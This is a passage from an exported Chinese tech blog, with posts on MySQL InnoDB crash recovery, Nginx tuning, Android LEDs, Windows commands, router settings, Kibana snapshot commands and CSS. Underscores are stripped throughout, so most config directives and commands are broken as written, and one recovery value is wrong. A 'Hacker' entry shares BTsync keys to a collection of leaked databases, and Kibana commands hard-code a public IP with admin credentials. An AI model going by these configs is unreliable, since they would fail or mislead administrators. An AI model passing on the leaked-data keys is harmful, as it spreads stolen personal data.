5242880\n\nInnoDB日志文件大小一旦确定就不能修改。如果改变了，数据库将不能启动。\n\n4、MySQL host表丢失\n\n有见过几次这样的情况。可能是一些异想不到的MyISAM bug。\n\n轻松将其修复如下：\n\n/usr/local/bin/mysqlinstalldb\n\n 5、不正常的MyISAM自动增长(autoincrement)\n\n如果MyISAM表自增计数变得紊乱，你就不能再插入新的纪录。\n通常你可以告诉自增计数器它现在工作不正常，通过将最后一条纪录的自增字段设为-1。\n\n解决问题-找到最后一条自增记录的有效值(执行如下命令)\n\nSELECT max(id) from tablename\n\n然后更新此表的自增计数器，如下：\n\nALTER TABLE tablename AUTOINCREMENT = id+1\n\n6、太多连接数\n\n数据库变得相当繁忙，因为连接数比它能处理的多。而且现在你都不能连接上你的数据库。\n首先，停止数据库：\n\n/usr/local/mysql/bin/mysqladmin -uUSERNAME -pPASSWORD shutdown\n\n如果上条命令不管用，可以试试 “killall mysql” 和 “killall mysqld”\n当数据库停止后，编辑/etc/my.cnf文件，增加连接数。不要痴狂的增加这个数字，否则你会把你的整台机器搞崩。\n\n在一台专用数据库机器上，我们通常用：\n\nmaxconnections = 200\nwaittimeout = 100\n\n试着重启数据库看看是否有帮助。\n如果你被查询弄的措手不及，需要连接数据库进行表修改操作，那么在/etc/my.cnf文件中设置一个不同的端口号，开启数据库，进行修改操作。然后将端口修改回来(master-port = 3306)再重启。\n\n 7、InnoDB表崩溃\n\nInnoDB表是我最钟爱的。事物缓存，可靠,不像MyISAM，InnoDB支持对同一表的并发写。\n\nInnoDB的内部恢复机制也相当不错。如果数据库崩溃，InnoDB将尝试进行修复，通过从最后一个时间戳开始运行日志文件。大多数情况都会成功，整个过程是透明的。\n\n不过，如果InnoDB自行修复失败，那么“整个”数据库将不能启动。MySQL将会发出一个错误信息并退出，你的整个库将处于离线状态。你可以不断尝试重启数据库，但是如果修复进程失败，数据库将拒绝启动。\n\n这就是为什么需要运行master/master当使用InnoDB时——当一个master宕掉时，还有一台冗余master做后备。\n\n在继续操作前，先浏览下MySQL的日志文件，确定数据库不是因为InnoDB表的崩溃而崩溃。\n\n有一种方法是更新InnoDB的日志文件计数器以跳过引起崩溃的查询，但是经验告诉我们这不是个好方法。这种情况下，将造成数据的不一致性而且会经常使主从复制中断。\n\n一旦因InnoDB崩溃造成数据库无法启动，你就应该按如下五个步骤处理问题：\n\n第一：添加此行到/etc/my.cnf文件中：\n\n[mysqld]\ninnodbforcerecovery = 4\n\n第二：重启MySQL。你的数据库现在将启动，但是在innodbforcerecovery参数作用下，所有的插入与更新操作将被忽略。\n\n第三：导出所有的表(Dump all tables)\n\n第四：关闭数据库，删除所有的数据文件。运行mysqlinstalldb 创建默认MySQL表。\n\n第五：从/etc/my.cnf文件中去掉innodbforcerecovery参数，重启数据库。(库现在应该能正常启动)\n\n第六：从备份文件中恢复所有数据。\n\n续：\n最近遇到了个让人棘手的任务——修复一个失败的InnoDB数据库。这个数据库因崩溃而无法启动。\n\n第一步将InnoDB在force-recovery模式下开启，此时InnoDB虽开启了但是将忽略所有更新(UPDATEs)与插入(INSERTs)操作。\n\n在/etc/my.cnf文件中添加此行：\n\ninnodbforcerecovery = 2\n\n现在重启数据库：\n\n/usr/local/bin/mysqldsafe \u0026\n\n(注意：如果MySQL没有启动，继续增加 innodbforcerecovery 的数值直到将参数值设为8( innodbforcerecovery =)\n\n将所有数据保存到临时文件alldb.sql(下个命令需要花一定时间)：\n\nmysqldump –force –compress –triggers –routines –create-options -uUSERNAME -pPASSWORD –all-databases   /usr/alldb.sql\n\n再次关闭数据库：\n\nmysqladmin -uUSERNAME -pPASSWORD shutdown\n\n删除数据库目录。(注意：我的数据目录在/usr/local/var下。你的设置有可能不同，确保删除的是正确的文件夹。)\n\nrm -fdr /usr/local/var\n\n重建数据库文件夹，安装MySQL基础表\n\nmkdir /usr/local/var\nchown -R mysql:mysql /usr/local/var\n/usr/local/bin/mysqlinstalldb\nchown -R mysql:mysql /usr/local/var\n\n从/etc/my.cnf文件中删除innodbforcerecovery ，重启数据库：\n\n/usr/local/bin/mysqldsafe \u0026\n\n导入所有备份文件(下一命令需要花一段时间)：\n\nmysql -uroot –compress \u003c /usr/alldb.sql\n\n最后，刷新MySQL的权限(因为我们也更新了MySQL的表)\n\n/usr/local/bin/mysqladmin -uroot flush-privileges\n\n注意：为了得到最好的结果，添加port=8819(或任何其他随机端口)到/etc/my.cnf文件中在重启MySQL之前，然后将–port=8819添加到mysqldump命令中。这种方法避免了MySQL数据库过于系繁忙当修复进程正在进行时。","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-11 Android Linux LED","title":"Android LED 输出","text":"1.2 LED使用1.2.1前言\nFirefly-RK3288开发板上有 2 个 LED 灯，如下表所示：\nLED GPIO ref. GPIO number\nBlue GPIO8A1 257\nYellow GPIO8A2 258\n可通过使用 LED 设备子系统或者直接操作 GPIO 控制该 LED。\n1.2.2以设备的方式控制 LED\n标准的 Linux 专门为 LED 设备定义了 LED 子系统。 在 Firefly-RK3288 开发板中的两个 LED 均以设备的形式被定义。\n用户可以通过 /sys/class/leds/ 目录控制这两个LED。\n更详细的说明请参考 leds-class.txt 。\n开发板上的 LED 的默认状态为：\n§ Blue:系统上电时打开\n§ Yellow：用户自定义\n用户可以通过 echo 向其 trigger 属性输入命令控制每一个 LED：\nroot@firefly:~ # echo none   /sys/class/leds/firefly:blue:power/trigger\nroot@firefly:~ # echo default-on   /sys/class/leds/firefly:blue:power/trigger\n用户还可以使用 cat 命令获取 trigger 的可用值：\nroot@firefly:~ # cat /sys/class/leds/firefly:blue:power/trigger\nnone [ir-power-click] testac-online testbattery-charging-or-full testbattery-chargingtestbattery-full testbattery-charging-blink-full-solid testusb-online mmc0 mmc1 mmc2backlight default-on rfkill0 rfkill1 rfkill2\n1.2.3 在内核中操作 LED\n在内核中操作 LED 的步骤如下：\n1、在 dts 文件中定义 LED 节点“leds”\n在kernel/arch/arm/boot/dts/firefly-rk3288.dts 文件中定义LED节点，具体定义如下：\nleds {\n  compatible =\"gpio-leds\";\n  power {\n    label =\"firefly:blue:power\";\n    linux,default-trigger =\"ir-power-click\";\n    default-state =\"on\";\n    gpios =\u0026gpio8 GPIOA1 GPIOACTIVELOW;\n    };\n  user{\n    label =\"firefly:yellow:user\";\n    linux,default-trigger =\"ir-user-click\";\n    default-state =\"off\";\n    gpios =\u0026gpio8 GPIOA2 GPIOACTIVELOW;\n    };\n  };\n\n注意：compatible 的值要跟 drivers/leds/leds-gpio.c 中的 .compatible 的值要保持一致。\n2、在驱动文件包含头文件\ninclude linux/leds.h\n3、在驱动文件中控制 LED。\n（1）、定义 LED 触发器\nDEFINELEDTRIGGER(ledtrigirclick);\n（2）、注册该触发器\nledtriggerregistersimple(\"ir-power-click\",\u0026ledtrigirclick);\n（3）、控制 LED 的亮灭。\nledtriggerevent(ledtrigirclick, LEDFULL);//亮\nledtriggerevent(ledtrigirclick, LED_OFF);//灭","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 Nginx配置性能优化","title":"Nginx配置性能优化","text":"大多数的Nginx安装指南告诉你如下基础知识——通过apt-get安装，修改这里或那里的几行配置，好了，你已经有了一个Web服务器了。而且，在大多数情况下，一个常规安装的nginx对你的网站来说已经能很好地工作了。然而，如果你真的想挤压出Nginx的性能，你必须更深入一些。在本指南中，我将解释Nginx的那些设置可以微调，以优化处理大量客户端时的性能。需要注意一点，这不是一个全面的微调指南。这是一个简单的预览——那些可以通过微调来提高性能设置的概述。你的情况可能不同。\n基本的 (优化过的)配置\n我们将修改的唯一文件是nginx.conf，其中包含Nginx不同模块的所有设置。你应该能够在服务器的/etc/nginx目录中找到nginx.conf。首先，我们将谈论一些全局设置，然后按文件中的模块挨个来，谈一下哪些设置能够让你在大量客户端访问时拥有良好的性能，为什么它们会提高性能。本文的结尾有一个完整的配置文件。\n高层的配置\nnginx.conf文件中，Nginx中有少数的几个高级配置在模块部分之上。\nuser www-data;\npid /var/run/nginx.pid;\nworkerprocesses auto;\nworkerrlimitnofile 100000;\nuser和pid应该按默认设置 - 我们不会更改这些内容，因为更改与否没有什么不同。\nworkerprocesses 定义了nginx对外提供web服务时的worker进程数。最优值取决于许多因素，包括（但不限于）CPU核的数量、存储数据的硬盘数量及负载模式。不能确定的时候，将其设置为可用的CPU内核数将是一个好的开始（设置为“auto”将尝试自动检测它）。\nworkerrlimitnofile 更改worker进程的最大打开文件数限制。如果没设置的话，这个值为操作系统的限制。设置后你的操作系统和Nginx可以处理比“ulimit -a”更多的文件，所以把这个值设高，这样nginx就不会有“too many open files”问题了。\nEvents模块\nevents模块中包含nginx中所有处理连接的设置。\nevents {\nworkerconnections 2048;\nmultiaccept on;\nuse epoll;\n}\nworkerconnections 设置可由一个worker进程同时打开的最大连接数。如果设置了上面提到的workerrlimitnofile，我们可以将这个值设得很高。\n记住，最大客户数也由系统的可用socket连接数限制（~ 64K），所以设置不切实际的高没什么好处。\nmultiaccept 告诉nginx收到一个新连接通知后接受尽可能多的连接。\nuse 设置用于复用客户端线程的轮询方法。如果你使用Linux 2.6+，你应该使用epoll。如果你使用BSD，你应该使用kqueue。\n（值得注意的是如果你不知道Nginx该使用哪种轮询方法的话，它会选择一个最适合你操作系统的）\nHTTP 模块\nHTTP模块控制着nginx http处理的所有核心特性。因为这里只有很少的配置，所以我们只节选配置的一小部分。所有这些设置都应该在http模块中，甚至你不会特别的注意到这段设置。\nhttp {\nservertokens off;\nsendfile on;\ntcpnopush on;\ntcpnodelay on;\n...\n}\nservertokens  并不会让nginx执行的速度更快，但它可以关闭在错误页面中的nginx版本数字，这样对于安全性是有好处的。\nsendfile 可以让sendfile()发挥作用。sendfile()可以在磁盘和TCP socket之间互相拷贝数据(或任意两个文件描述符)。Pre-sendfile是传送数据之前在用户空间申请数据缓冲区。之后用read()将数据从文件拷贝到这个缓冲区，write()将缓冲区数据写入网络。sendfile()是立即将数据从磁盘读到OS缓存。因为这种拷贝是在内核完成的，sendfile()要比组合read()和write()以及打开关闭丢弃缓冲更加有效(更多有关于sendfile)。\ntcpnopush 告诉nginx在一个数据包里发送所有头文件，而不一个接一个的发送。\ntcpnodelay 告诉nginx不要缓存数据，而是一段一段的发送--当需要及时发送数据时，就应该给应用设置这个属性，这样发送一小块数据信息时就不能立即得到返回值。\naccesslog off;\nerrorlog /var/log/nginx/error.log crit;\naccesslog 设置nginx是否将存储访问日志。关闭这个选项可以让读取磁盘IO操作更快(aka,YOLO)\nerrorlog 告诉nginx只能记录严重的错误：\nkeepalivetimeout 10;\nclientheadertimeout 10;\nclientbodytimeout 10;\nresettimedoutconnection on;\nsendtimeout 10;\nkeepalivetimeout  给客户端分配keep-alive链接超时时间。服务器将在这个超时时间过后关闭链接。我们将它设置低些可以让ngnix持续工作的时间更长。\nclientheadertimeout 和clientbodytimeout 设置请求头和请求体(各自)的超时时间。我们也可以把这个设置低些。\nresettimeoutconnection 告诉nginx关闭不响应的客户端连接。这将会释放那个客户端所占有的内存空间。\nsendtimeout 指定客户端的响应超时时间。这个设置不会用于整个转发器，而是在两次客户端读取操作之间。如果在这段时间内，客户端没有读取任何数据，nginx就会关闭连接。\nlimitconnzone $binaryremoteaddr zone=addr:5m;\nlimitconn addr 100;\nlimitconnzone 设置用于保存各种key（比如当前连接数）的共享内存的参数。5m就是5兆字节，这个值应该被设置的足够大以存储（32K5）32byte状态或者（16K5）64byte状态。\nlimitconn 为给定的key设置最大连接数。这里key是addr，我们设置的值是100，也就是说我们允许每一个IP地址最多同时打开有100个连接。\ninclude /etc/nginx/mime.types;\ndefaulttype text/html;\ncharset UTF-8;\ninclude 只是一个在当前文件中包含另一个文件内容的指令。这里我们使用它来加载稍后会用到的一系列的MIME类型。\ndefaulttype 设置文件使用的默认的MIME-type。\ncharset 设置我们的头文件中的默认的字符集\ngzip on;\ngzipdisable \"msie6\";\ngzipstatic on;\ngzipproxied any;\ngzipminlength 1000;\ngzipcomplevel 4;\ngziptypes text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;\ngzip 是告诉nginx采用gzip压缩的形式发送数据。这将会减少我们发送的数据量。\ngzipdisable 为指定的客户端禁用gzip功能。我们设置成IE6或者更低版本以使我们的方案能够广泛兼容。\ngzipstatic 告诉nginx在压缩资源之前，先查找是否有预先gzip处理过的资源。这要求你预先压缩你的文件（在这个例子中被注释掉了），从而允许你使用最高压缩比，这样nginx就不用再压缩这些文件了（想要更详尽的gzipstatic的信息，请点击这里）。\ngzipproxied 允许或者禁止压缩基于请求和响应的响应流。我们设置为any，意味着将会压缩所有的请求。\ngzipminlength 设置对数据启用压缩的最少字节数。如果一个请求小于1000字节，我们最好不要压缩它，因为压缩这些小的数据会降低处理此请求的所有进程的速度。\ngzipcomplevel 设置数据的压缩等级。这个等级可以是1-9之间的任意数值，9是最慢但是压缩比最大的。我们设置为4，这是一个比较折中的设置。\ngziptype 设置需要压缩的数据格式。上面例子中已经有一些了，你也可以再添加更多的格式。\n cache informations about file descriptors, frequently accessed files\ncan boost performance, but you need to test those values\nopenfilecache max=100000 inactive=20s;\nopenfilecachevalid 30s;\nopenfilecacheminuses 2;\nopenfilecacheerrors on;\n\nVirtual Host Configs\n aka our settings for specific servers\ninclude /etc/nginx/conf.d/.conf;\ninclude /etc/nginx/sites-enabled/;\nopenfilecache 打开缓存的同时也指定了缓存最大数目，以及缓存的时间。我们可以设置一个相对高的最大时间，这样我们可以在它们不活动超过20秒后清除掉。\nopenfilecachevalid 在openfilecache中指定检测正确信息的间隔时间。\nopenfilecacheminuses 定义了openfilecache中指令参数不活动时间期间里最小的文件数。\nopenfilecacheerrors 指定了当搜索一个文件时是否缓存错误信息，也包括再次给配置中添加文件。我们也包括了服务器模块，这些是在不同文件中定义的。如果你的服务器模块不在这些位置，你就得修改这一行来指定正确的位置。\n一个完整的配置\nuser www-data;\npid /var/run/nginx.pid;\nworkerprocesses auto;\nworkerrlimitnofile 100000;\nevents {\nworkerconnections 2048;\nmultiaccept on;\nuse epoll;\n}\nhttp {\nservertokens off;\nsendfile on;\ntcpnopush on;\ntcpnodelay on;\naccesslog off;\nerrorlog /var/log/nginx/error.log crit;\nkeepalivetimeout 10;\nclientheadertimeout 10;\nclientbodytimeout 10;\nresettimedoutconnection on;\nsendtimeout 10;\nlimitconnzone $binaryremoteaddr zone=addr:5m;\nlimitconn addr 100;\ninclude /etc/nginx/mime.types;\ndefaulttype text/html;\ncharset UTF-8;\ngzip on;\ngzipdisable \"msie6\";\ngzipproxied any;\ngzipminlength 1000;\ngzipcomplevel 6;\ngziptypes text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;\nopenfilecache max=100000 inactive=20s;\nopenfilecachevalid 30s;\nopenfilecacheminuses 2;\nopenfilecacheerrors on;\ninclude /etc/nginx/conf.d/.conf;\ninclude /etc/nginx/sites-enabled/*;\n}\n编辑完配置后，确认重启nginx使设置生效。\nsudo service nginx restart","tags":null},{"location":"//blog.pytool.com/Other/2011-01-01 windows 常见命令","title":"Windows常用命令","text":"---\n\n[Hyper-V 管理器] virtmgmt.msc \n[高级安全Windows防火墙] WF.msc\n\nDevModeRunAsUserConfig.msc 【用户配置】\n[TPM 本地计算机上受信任的平台模块(TPM)管理] tpm.msc\n[计划任务] taskschd.msc\nsecpol.msc 【[本地安全策略]】\nprintmanagement.msc 【[打印机管理]】\ncomexp.msc 【组件服务】\nazman.msc 【授权管理器】\ncertlm.msc 【证书-本地计算机】\ncertmgr.msc 【证书-当前用户】\n\ngpedit.msc 【本地组策略】\nCompMgmtLauncher.exe\ncompmgmt.msc 【计算机管理】\n【系统工具】\n    eventvwr.msc 【事件查看器】 eventvwr.exe\n    fsmgmt.msc 【共享文件夹】\n    lusrmgr.msc 【本地用户和组】\n    perfmon.msc 【性能监视器】perfmon.exe\n    devmgmt.msc 【设备管理器】\n【存储】\n    diskmgmt.msc 【磁盘管理】\n【服务和应用程序】\n    services.msc 【服务】 \n    WmiMgmt.msc  【WMI控件管理】\nresmon.exe 【资源监视器】\n\ncontrol.exe 【控制面板】\nmsconfig.exe 【系统配置】\nmmc.exe \n\nMRT.exe 【恶意软件清除】\nmsinfo32.exe 【系统信息】\nmspaint.exe 【绘图】\nNetplwiz.exe 【用户账户】\nOptionalFeatures.exe 【启用关闭 windows功能】\npsr.exe【步骤记录器】\nSnippingTool.exe 【截图】\nTaskmgr.exe\nUserAccountControlSettings.exe 【用户账户控制UAC】 \nvmconnect.exe 【虚拟机连接】\nAT 计划在计算机上运行的命令和程序。\nATTRIB 显示或更改文件属性。\nBREAK 设置或清除扩展式 CTRL+C 检查。\nCACLS 显示或修改文件的访问控制列表(ACLs)。\nCALL 从另一个批处理程序调用这一个。\nCD 显示当前目录的名称或将其更改。\nCHCP 显示或设置活动代码页数。\nCHDIR 显示当前目录的名称或将其更改。\nCHKDSK 检查磁盘并显示状态报告。\nCHKNTFS 显示或修改启动时间磁盘检查。\nCLS 清除屏幕。\nCMD 打开另一个 Windows 命令解释程序窗口。\nCOLOR 设置默认控制台前景和背景颜色。\nCOMP 比较两个或两套文件的内容。\nCOMPACT 显示或更改 NTFS 分区上文件的压缩。\nCONVERT 将 FAT 卷转换成 NTFS。您不能转换当前驱动器。\nCOPY 将至少一个文件复制到另一个位置。\nDATE 显示或设置日期。\n\nDEL 删除至少一个文件。\nDIR 显示一个目录中的文件和子目录。\nDISKCOMP 比较两个软盘的内容。\nDISKCOPY 将一个软盘的内容复制到另一个软盘。\nDOSKEY 编辑命令行、调用 Windows 命令并创建宏。\nECHO 显示消息，或将命令回显打开或关上。\nENDLOCAL 结束批文件中环境更改的本地化。\nERASE 删除至少一个文件。\nEXIT 退出 CMD.EXE 程序(命令解释程序)。\nFC 比较两个或两套文件，并显示不同处。\nFIND 在文件中搜索文字字符串。\nFINDSTR 在文件中搜索字符串。\nFOR 为一套文件中的每个文件运行一个指定的命令。\nFORMAT 格式化磁盘，以便跟 Windows 使用。\nFTYPE 显示或修改用于文件扩展名关联的文件类型。\nGOTO 将 Windows 命令解释程序指向批处理程序中某个标明的行。\nGRAFTABL 启用 Windows 来以图像模式显示扩展字符集。\nHELP 提供 Windows 命令的帮助信息。\nIF 执行批处理程序中的条件性处理。\nLABEL 创建、更改或删除磁盘的卷标。\nMD 创建目录。\nMKDIR 创建目录。\nMODE 配置系统设备。\nMORE 一次显示一个结果屏幕。\nMOVE 将文件从一个目录移到另一个目录。\nPATH 显示或设置可执行文件的搜索路径。\nPAUSE 暂停批文件的处理并显示消息。\nPOPD 还原 PUSHD 保存的当前目录的上一个值。\nPRINT 打印文本文件。\nPROMPT 更改 Windows 命令提示符。\nPUSHD 保存当前目录，然后对其进行更改。\nRD 删除目录。\nRECOVER 从有问题的磁盘恢复可读信息。\nREM 记录批文件或 CONFIG.SYS 中的注释。\nREN 重命名文件。\nRENAME 重命名文件。\nREPLACE 替换文件。\nRMDIR 删除目录。\nSET 显示、设置或删除 Windows 环境变量。\nSETLOCAL 开始批文件中环境更改的本地化。\nSHIFT 更换批文件中可替换参数的位置。\nSORT 对输入进行分类。\nSTART 启动另一个窗口来运行指定的程序或命令。\nSUBST 将路径跟一个驱动器号关联。\nTIME 显示或设置系统时间。\nTITLE 设置 CMD.EXE 会话的窗口标题。\nTREE 以图形模式显示驱动器或路径的目录结构。\nTYPE 显示文本文件的内容。\nVER 显示 Windows 版本。\nVERIFY 告诉 Windows 是否验证文件是否已正确写入磁盘。\nVOL 显示磁盘卷标和序列号。\nXCOPY 复制文件和目录树。\nappwiz.cpl","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-11 Android Linux LED子系统","title":"Android 按键输入","text":"---\nLED子系统剖析（一）\nPlatform设备之gpio-led分析\nled子系统\ngpio框架及处理流程分析\nOpenWRT中的按键和灯的GPIO控制实现\n初探linux子系统集之led子系统(一)","tags":null},{"location":"//blog.pytool.com/Other/2011-01-01 路由器","title":"路由器","text":"WDS 网桥\n通过 WDS 功能，WS318可以通过无线方式和其它无线路由器建立连接，扩展无线网络的覆盖范围。通过 WDS 互联的无线设备，其无线信道、无线名称、无线加密方式、无线密钥和 WDS 的加密方式都必须保持一致，且只有一台路由器开启 DHCP Server 功能，才能正常连接。为避免 IP 地址冲突，请确保所有通过 WDS 互联的无线设备的 Web 页面登录地址是唯一的。\n启用 2.4 GHz 频段的 WDS 功能。启用后，WS318可通过 2.4 GHz 频段和其它无线路由器建立连接，进而扩展无线网络覆盖范围。\n    启用：\n\n    启用后允许其它无线路由器接入WS318。\n    信道：\n\n    WS318无线信号的通道。信道为“自适应”时将无法开启 WDS 功能。您可以在“无线高级设置”中进行设置。\n    扫描：\n\n    可用于扫描与WS318在同一信道中的无线路由器的 MAC 地址。扫描成功后，可直接在扫描结果中勾选对端 无线路由器的 MAC 地址，WS318会自动将勾选的 MAC 地址添加到列表中，以便与对端无线路由器建立 WDS 连接。\n\n智能覆盖设置\n\n当您家里有多个支持智能覆盖的华为无线路由器、无线扩展器时，您可以开启智能覆盖功能，让它们的无线参数自动同步，组成一个大的智能无线网络。这样，无论您是在客厅、书房还是卧室上网，我们都能帮您自动连接到最合适的无线网络，让您尽享智能无线家居生活。\n\n您可以对无线网络做更多个性化的设置，适应各种无线网络环境。\n\n    信道：\n\n    根据不同信道的受干扰程度，选择无线网络的信道。一般家庭网络选择 “自适应”，由WS318自动选取信道。\n    WMM(QoS)：\n\n    在无线网络通信中，保障高质量的数据、语音、音乐、视频应用。\n    速率：\n\n    无线网络的传输速率。一般家庭网络选择“自适应”。\n\n通用即插即用 (UPnP)\n  Universal Plug and Play，支持多种网络设备的即插即用和自动发现。启用 UPnP，则允许支持 UPnP 的设备自动加入网络，简化配置操作。","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/regexp","title":"golang 中regexp包用法","text":"---\nchenbaoke的专栏\ngolang 中regexp包用法\n本文转自Golove博客：http://www.cnblogs.com/golove/p/3270918.html\nregexp 包中的函数和方法\n// regexp.go","tags":null},{"location":"//blog.pytool.com/Other/2015-01-01 常用软件","title":"常用网站","text":"firefox 插件\npan SwitchyOmega\nVimFx\n\nffmpeg -loglevel verbose -re -i Android.mp4  -vcodec libx264 -vprofile baseline -acodec libmp3lame -ar 44100 -ac 1    -f flv rtmp://localhost:1935/hls/movie\n\n 0x01 网络安全\nWi.cap\nIP tools\nPingTools\nPacket Capture\n0x02 翻墙工具\nPsiphon\nVpn gate list\nShadowsock\nLantern\n 0x00 系统工具\nSD Maid\nMiXplorer文件管理器\n播放器\nDicePlayer\nGoodplayer\n\n麦子学院\n极客学院\n慕课网\n\n开源中国\ngit@OSC\nLinux 手册\nLearn Program\n\n简书\n开眼视频\n火柴盒\n创意设计\n\n大家中医\n\nScience Journal\n\n作者：杨阳\n链接：https://www.zhihu.com/question/22867411/answer/57448387\n来源：知乎\n著作权归作者所有，转载请联系作者获得授权。\n\nwiz:笔记软件,资料收集。\nleanote:和wiz差不多的开源私人云笔记软件，全平台支持，我准备从wiz转到leanote了。\nknotes:便签\ngrep+awk+cut+tail+head+cat+bash+vim+kwrite:文本处理\nchrome+firefox+adblock+goagent+wget+curl+lynx:网页浏览，http分析，文件下载，查资料，工作时间开小差。\ndia+inkscape:日常绘图\nksnapshot:截图\nweb qq:即时通讯，群交流\nweb微信+ftp:手机电脑互传文件。\nremmina+ssh+telnet+konsole+minicom:设备远程连接,终端模拟器\nwireshark+tcpdump+tshark+tcpflow:抓包解包。\ndolphin+git:文件管理+ftp管理。\nwps:处理office文档\nvlc:影音播放，网络串流播放测试。\naudaccity:音频剪辑。\nfcitx:输入法\nhydra:破解密码，以及辅助记忆密码。\nkvm+docker:虚拟化\nokular:pdf查看\ntar+unrar+unzip:压缩解压。\nnetworkmanager:网络配置+热点分享\n百度网盘+微云:辅助下载以及文件备份分享。\n百度+google:不说\ngithub:找/存代码\n频率最高，用得较多，感受最深，存在感最强的差不多就这些了。没错，这是一只进击的运维狗。\n一只爱好就是linux，娱乐就是玩linux，的运维狗。\n工作也是linux。","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/sort","title":"golang中sort包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/os","title":"golang中os包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/time","title":"golang中time包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/strconv","title":"golang 中strconv包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/io","title":"golang中io包用法（二）","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Hacker/2016-10-22 BTsync","title":"BTsync","text":"最近几年网上泄露、流传出来的各种数据库，已收集有70G+\n\nBtSync密钥：BHMIILA2HRJ5ZG6FN6KE7YUKBZMQOFCOA\n\nlinux、python、shell、php、web前端、互联网...\nbtsync: BI3ACGSYU7DTURRU44AKLJ6FQNYXZG64P\n在Newsfeed关注\nKINDLE精品电子书资源\nBitTorrent Sync:BLE2YCVCA3JPQCRZGDQVTFTKQYPDH5MQC\n\n导航密钥（大家共同分享）\nAAXVLKUOK5UVP2C3YFKNJJ5SFYALP2DKU\n\nhttps://mega.nz/#F!GJlE3QDY!322d8-f-7QOwPgxfKTUOzw","tags":null},{"location":"//blog.pytool.com/Hardware/Android 底层/2016-01-07 Linux内核 编程基础","title":"编程基础","text":"Google 开源项目风格指南\n使用 getopt() 进行命令行处理\nC/C++ 中的0长数组（柔性数组）\n\nEOF是ASCII码为255的字符，对应的有符号数是-1\ndefine EOF (-1)\nWindows Ctrl-Z\nLinux Ctrl-D\n\n Linux如何查看与/dev/input目录下的event对应的设备\n ls /dev/input #查看所有Input输入事件 event0~x\n cat /proc/bus/input/devices  #查看event和input 关联\n查看中断\n cat /proc/interrupts","tags":null},{"location":"//blog.pytool.com/Post/Elastic/Kibana/2016-10-04 elastic 基础 ","title":"Kibana 基础","text":" Kibana 5.x 加强安全 \n\n/scripts/importdashboards -es http://120.92.36.21:9200 -user elastic -pass changeme\n产看数据\ncurl '120.92.36.21:9200/.kibana/search?q=*\u0026pretty'\n\ncurl -XPOST '120.92.36.21:9200/.kibana/search?pretty' -d '\n{\n  \"query\": { \"matchall\": {} }\n}'\n\n close the kibana index, restore it from snapshot, and reopen it\ncloseKibanaIndexCmd=\"curl -XPOST /.kibana/close\\\"\"\nrestoreSnapshotCmd=\"curl -XPOST /snapshot/elkbackup/$1/restore\\\"\"\nreopenKibanaIndexCmd=\"curl -XPOST /.kibana/open\\\"\"\nsnapshotRepoCmd=\"curl -XPUT -s $authString \\\"$elkbaseurl/snapshot/elkbackup\\\" -d '{\n      \\\"type\\\": \\\"fs\\\",\n      \\\"settings\\\": {\n          \\\"location\\\": \\\"/tmp/elkinstalldir/snapshots/\\\"\n      }\n  }'\"\n\necho \"creating repo...\"\neval $snapshotRepoCmd\necho \"closing kibana index...\"\necho \"restoring snapshot...\"\n\necho \"reopening kibana index...\"\n\ncurl -XPOST -u esadmin:esadmin  -s \"http://120.92.36.21:9200/.kibana/close\"\ncurl -XPOST -u esadmin:esadmin  -s \"http://120.92.36.21:9200/snapshot/elkbackup/$1/restore\"\ncurl -XPOST -u esadmin:esadmin  -s \"http://120.92.36.21:9200/.kibana/open\"","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 Activity详解","title":"Activity详解","text":"Activity四种启动模式详解\nAndroid生命周期\n理解Fragment生命周期\n\nActivity四种启动模式详解\n\nstandard       ［多任务，多实例］ 可重复启动\nsingleTop      ［栈顶单任务，多实例］任务桟的桟顶，不再启动新实例\nsingleTask     ［单任务、多实例］ 如果系统中已经存在这样一个实例，就会将这个实例调度到任务栈的栈顶，并清除它当前所在任务中位于它上面的所有的activity\nsingleInstance ［单任务、单实例］ \n如果要使用这四种启动模式，必须在manifest文件中activity标签中的launchMode属性中配置，如：\n   ","tags":null},{"location":"//blog.pytool.com/Reship/2015-01-07-responsive-background-image","title":"【译】CSS实现响应式全屏背景图","text":"当前很流行的一种网页形式就是满屏大图，本文将用最简单的方式实现该效果。用到了CSS 属性background-size ,无需javascript。\n\n先看demo，打开后，调整浏览器窗口大小，观察背景图的变化。\n\n如果在你的项目中也需要这样的效果，那么你就来对地方了。\n\n核心概念\n使用background-size 属性，填充整个viewport\n\n    当css属性background-size 值为cover时，浏览器会自动按比例缩放背景图的宽和高，直到大于或等于viewport的宽和高\n\n使用媒体查询为移动设备提供更小尺寸的背景图\n\n\t为什么要给移动设备提供小尺寸背景图呢？在demo中，我们看到的背景图的实际尺寸为5498px  3615px，使用这么大尺寸图片的目的是满足绝大多数宽屏显示器，并且不会显示模糊，而代价就是1.7MB的图片体积。\n\n \t但是在移动设备上没有必要使用这么大的图片，同时大图还会导致加载变慢，尤其是在移动网络下。\n\n \t需要说明的是：为移动设备提供小背景图对该技术方案来说是可选的。\n\n实践\nHTML\n\n        !doctype html\n        html\n        body\n            ...Your content goes here...\n        /body\n        /html\n\n    \n \t后面我们会给body标签指定背景图，这样背景图就可以填充整个浏览器viewport了。\n\n \t其实，该方案对所有的块级容器都可以生效。如果你的块级容器的宽高是动态的，那么背景图将自动伸缩，充满整个容器。\n\nCSS\n\n\tbody标签的样式如下：\n\n        body {\n        / 加载背景图 /\n        background-image: url(images/background-photo.jpg);\n      \n        / 背景图垂直、水平均居中 /\n        background-position: center center;\n      \n        / 背景图不平铺 /\n        background-repeat: no-repeat;\n      \n        / 当内容高度大于图片高度时，背景图像的位置相对于viewport固定 /\n        background-attachment: fixed;\n      \n        / 让背景图基于容器大小伸缩 